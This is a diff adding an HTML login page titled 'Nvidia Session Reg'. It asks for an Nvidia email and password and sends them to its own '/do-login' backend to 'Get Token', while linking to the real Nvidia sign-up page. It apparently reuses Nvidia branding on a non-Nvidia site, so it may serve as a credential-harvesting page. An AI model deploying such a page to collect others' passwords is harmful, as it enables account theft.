@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nvidia Session Reg</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+      color: white;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 15px;
+      padding: 60px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      max-width: 500px;
+      width: 100%;
+      animation: fadeIn 1s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    h1 {
+      margin-bottom: 30px;
+      font-size: 2.5em;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+    input {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      outline: none;
+      transition: background 0.3s;
+    }
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.7);
+    }
+    input:focus {
+      background: rgba(255, 255, 255, 0.3);
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      margin: 20px 0;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(45deg, #ff6b6b, #feca57);
+      color: white;
+      font-size: 18px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    .link {
+      color: #feca57;
+      text-decoration: none;
+      cursor: pointer;
+      transition: color 0.3s;
+    }
+    .link:hover {
+      color: #ff6b6b;
+    }
+    .message {
+      margin-top: 20px;
+      padding: 10px;
+      border-radius: 5px;
+      display: none;
+    }
+    .error {
+      background: rgba(255, 0, 0, 0.2);
+      color: #ff6b6b;
+    }
+    .loading {
+      background: rgba(255, 255, 255, 0.1);
+      color: white;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Nvidia Session Reg</h1>
+    <form id="loginForm">
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Get Token</button>
+    </form>
+    <p>If you do not have an account, <span class="link" onclick="copyLink()">click here</span></p>
+    <div id="message" class="message"></div>
+  </div>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const error = urlParams.get('error');
+    if (error) {
+      const messageDiv = document.getElementById('message');
+      messageDiv.textContent = 'Error: ' + decodeURIComponent(error);
+      messageDiv.classList.add('error');
+      messageDiv.style.display = 'block';
+    }
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const email = this.email.value;
+      const password = this.password.value;
+      const data = { email, password };
+      document.querySelector('.container').innerHTML = `
+        <h1>In the meantime, check your mail and verify if available.</h1>
+        <div class="loading message" style="display: block;">Processing your request...</div>
+      `;
+      try {
+        const response = await fetch('/do-login', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+        if (response.redirected) {
+          window.location.href = response.url;
+        } else {
+          window.location.href = '/?error=unknown';
+        }
+      } catch (error) {
+        window.location.href = '/?error=' + encodeURIComponent(error.message);
+      }
+    });
+    async function copyLink() {
+      const link = 'https://learn.nvidia.com/join?auth=login&redirectPath=/my-learning';
+      try {
+        await navigator.clipboard.writeText(link);
+        alert('Link copied to clipboard!');
+      } catch (err) {
+        const textArea = document.createElement('textarea');
+        textArea.value = link;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        alert('Link copied to clipboard!');
+      }
+    }
+  </script>
+</body>
+</html>
